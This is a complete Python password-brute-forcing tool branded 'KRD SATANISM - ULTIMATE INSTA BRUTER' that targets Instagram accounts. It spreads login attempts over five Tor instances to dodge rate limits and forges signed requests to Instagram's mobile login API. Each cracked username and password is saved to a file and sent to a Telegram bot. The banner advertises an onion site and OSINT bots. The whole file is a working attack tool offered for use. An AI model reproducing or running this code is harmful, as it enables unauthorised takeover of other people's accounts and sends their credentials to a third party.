#!/usr/bin/env python3
import os
import sys
import time
import socket
import threading
import subprocess
import requests
import random
import hashlib
import json
import queue
import signal
from stem import Signal
from stem.control import Controller
from stem.process import launch_tor_with_config


TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN "  # Replace with your actual token
TELEGRAM_CHAT_ID = " YOUR_CHAT_ID"      # Replace with your actual chat ID
TOR_INSTANCES = 5                      # Number of Tor instances to create
PASSWORD_FILE = "common-passwords.txt"        # Default password file

password_found = False
password_queue = queue.Queue()
tor_processes = []
tor_ports = []
active_threads = []
shutdown_event = threading.Event()

def banner():
    print("\033[1;35m")
    print(r"""
      (\___/)
      (•ㅅ•)
     ┏━∪∪━━━━┓
       K R D
     SATANISM
        BRUTER
     ┗━━━━━━━━┛
    """)
    print("\033[0m")
    print("\033[1;31mKRD SATANISM - ULTIMATE INSTA BRUTER v1.0\033[0m")
    print("ONIONS: http://uww6ddtbjrjl264zjjvsgxdryzg2upmkq2wry5vkyjkhc34xyhtxpfad.onion")
    print("OSINT BOTS: @database_krd_bot @PhoneKrdBot")
    print("\033[1;33mDARK GODS GUIDE OUR VULNERABILITY SCANS\033[0m")
    print("")

def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("\033[1;91m[!] Telegram notifications disabled - missing token or chat ID\033[0m")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            print("\033[1;92m[+] Telegram notification sent successfully\033[0m")
            return True
        else:
            print(f"\033[1;91m[!] Telegram API error: {response.text}\033[0m")
    except Exception as e:
        print(f"\033[1;91m[!] Telegram connection failed: {str(e)}\033[0m")
    return False

def check_dependencies():
    required = ['tor', 'curl', 'openssl']
    missing = []
    for dep in required:
        if not subprocess.run(['which', dep], stdout=subprocess.PIPE).returncode == 0:
            missing.append(dep)
    
    if missing:
        print("\033[1;91m[!] Missing dependencies:\033[0m")
        for dep in missing:
            print(f" - {dep}")
        print("\033[1;92m[+] Install with:\033[0m")
        print("sudo apt install", " ".join(missing))
        return False
    return True

def start_tor_instance(port):
    config = {
        'SocksPort': str(port),
        'ControlPort': str(port + 10000),
        'DataDirectory': f'/tmp/tor_{port}',
        'ExitNodes': '{us}',
        'StrictNodes': '1',
    }
    
    try:
        os.makedirs(f'/tmp/tor_{port}', exist_ok=True)
        tor_process = launch_tor_with_config(
            config=config,
            tor_cmd='tor',
            take_ownership=True,
            init_msg_handler=lambda line: print(f"\033[1;92m[*] Tor {port}: {line}\033[0m") if "Bootstrapped" in line else None
        )
        return tor_process
    except Exception as e:
        print(f"\033[1;91m[!] Failed to start Tor on port {port}: {str(e)}\033[0m")
        return None

def check_tor_connection(port):
    proxies = {
        'http': f'socks5h://127.0.0.1:{port}',
        'https': f'socks5h://127.0.0.1:{port}'
    }
    try:
        response = requests.get('https://check.torproject.org/api/ip', proxies=proxies, timeout=30)
        return response.json().get('IsTor', False)
    except Exception:
        return False

def try_login(username, password, port):
    global password_found
    
    if password_found or shutdown_event.is_set():
        return False
        
    proxies = {
        'http': f'socks5h://127.0.0.1:{port}',
        'https': f'socks5h://127.0.0.1:{port}'
    }
    
    try:
        session = requests.Session()
        session.proxies = proxies
        uuid = ''.join(random.choices('abcdef0123456789', k=32))
        csrf_response = session.get(
            f'https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={uuid}',
            headers={'User-Agent': 'Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'},
            timeout=30
        )
        csrf_token = csrf_response.cookies.get('csrftoken')
        
        if not csrf_token:
            print(f"\033[1;91m[!] Failed to get CSRF token on port {port}\033[0m")
            return False

        device_id = f"android-{''.join(random.choices('abcdef0123456789', k=16))}"
        data = {
            "phone_id": ''.join(random.choices('abcdef0123456789', k=8)) + "-" + ''.join(random.choices('abcdef0123456789', k=4)) + "-" + ''.join(random.choices('abcdef0123456789', k=4)) + "-" + ''.join(random.choices('abcdef0123456789', k=4)) + "-" + ''.join(random.choices('abcdef0123456789', k=12)),
            "_csrftoken": csrf_token,
            "username": username,
            "guid": ''.join(random.choices('abcdef0123456789', k=8)) + "-" + ''.join(random.choices('abcdef0123456789', k=4)) + "-" + ''.join(random.choices('abcdef0123456789', k=4)) + "-" + ''.join(random.choices('abcdef0123456789', k=4)) + "-" + ''.join(random.choices('abcdef0123456789', k=12)),
            "device_id": device_id,
            "password": password,
            "login_attempt_count": "0"
        }

        ig_sig = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac = hashlib.sha256((json.dumps(data) + ig_sig).encode()).hexdigest()

        login_response = session.post(
            "https://i.instagram.com/api/v1/accounts/login/",
            data=f"ig_sig_key_version=4&signed_body={hmac}.{json.dumps(data)}",
            headers={
                'User-Agent': 'Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)',
                'Connection': 'close',
                'Accept': '*/*',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie2': '$Version=1',
                'Accept-Language': 'en-US'
            },
            timeout=30
        )

        if login_response.status_code == 200:
            response_json = login_response.json()
            if response_json.get('authenticated', False) or 'logged_in_user' in login_response.text:
                print(f"\033[1;92m\n[+] PASSWORD FOUND: {password}\033[0m")
                if 'challenge' in login_response.text:
                    print("\033[1;92m[*] Challenge required\033[0m")
                return True
        elif login_response.status_code == 400:
            if 'challenge_required' in login_response.text:
                print(f"\033[1;92m\n[+] PASSWORD FOUND (Challenge): {password}\033[0m")
                return True
                
    except Exception as e:
        print(f"\033[1;91m[!] Error trying password {password}: {str(e)}\033[0m")
    
    return False

def worker(username, port):
    global password_found
    
    while not password_queue.empty() and not password_found and not shutdown_event.is_set():
        password = password_queue.get()
        try:
            if try_login(username, password, port):
                password_found = True
                with open("found.instainsane", "a") as f:
                    f.write(f"Username: {username}, Password: {password}\n")
                
                message = f"<b>KRD SATANISM BRUTE INSTA RESULT</b>\n\n" \
                         f"🟢 <b>Password Found!</b>\n" \
                         f"👤 <b>Username:</b> {username}\n" \
                         f"🔑 <b>Password:</b> <code>{password}</code>\n" \
                         f"⏱ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
                send_telegram(message)
         
                shutdown_event.set()
                return
        finally:
            password_queue.task_done()

def signal_handler(sig, frame):
    print("\033[1;91m\n[!] Ctrl+C detected. Shutting down...\033[0m")
    shutdown_event.set()
    cleanup()
    sys.exit(0)

def cleanup():
    untested = []
    while not password_queue.empty():
        untested.append(password_queue.get())
        password_queue.task_done()
    
    if untested:
        filename = f"nottested.{int(time.time())}.lst"
        with open(filename, "w") as f:
            f.write("\n".join(untested))
        print(f"\033[1;92m[*] Saved untested passwords to {filename}\033[0m")
    
    for process in tor_processes:
        try:
            process.terminate()
            process.wait()
        except:
            pass
    
    print("\033[1;92m[+] Cleanup complete\033[0m")

def main():
    global password_found, tor_processes, tor_ports
    
    banner()
    
    if not check_dependencies():
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)

    username = input("\033[1;92m[?] Instagram username: \033[0m").strip()
    if not username:
        print("\033[1;91m[!] Username cannot be empty\033[0m")
        sys.exit(1)

    password_file = input(f"\033[1;92m[?] Password file [default: {PASSWORD_FILE}]: \033[0m").strip() or PASSWORD_FILE
    if not os.path.exists(password_file):
        print(f"\033[1;91m[!] Password file not found: {password_file}\033[0m")
        sys.exit(1)

    with open(password_file, "r", errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    if not passwords:
        print("\033[1;91m[!] No passwords found in file\033[0m")
        sys.exit(1)

    for password in passwords:
        password_queue.put(password)

    print(f"\033[1;92m[*] Starting {TOR_INSTANCES} Tor instances...\033[0m")
    for i in range(TOR_INSTANCES):
        port = 9051 + i
        process = start_tor_instance(port)
        if process:
            tor_processes.append(process)
            tor_ports.append(port)
            time.sleep(2) 

 
    print("\033[1;92m[*] Verifying Tor connections...\033[0m")
    for port in tor_ports:
        if check_tor_connection(port):
            print(f"\033[1;92m[+] Port {port}: Connection successful\033[0m")
        else:
            print(f"\033[1;91m[!] Port {port}: Connection failed\033[0m")
            shutdown_event.set()
            cleanup()
            sys.exit(1)

    print("\033[1;92m[*] Starting brute force attack...\033[0m")
    print("\033[1;91m[*] Press Ctrl+C to stop and save progress\033[0m")
    
    for port in tor_ports:
        t = threading.Thread(target=worker, args=(username, port))
        t.daemon = True
        t.start()
        active_threads.append(t)

    try:
        while any(t.is_alive() for t in active_threads):
            time.sleep(1)
            if password_found:
                break
    except KeyboardInterrupt:
        shutdown_event.set()
    
    cleanup()

if __name__ == "__main__":
    main()
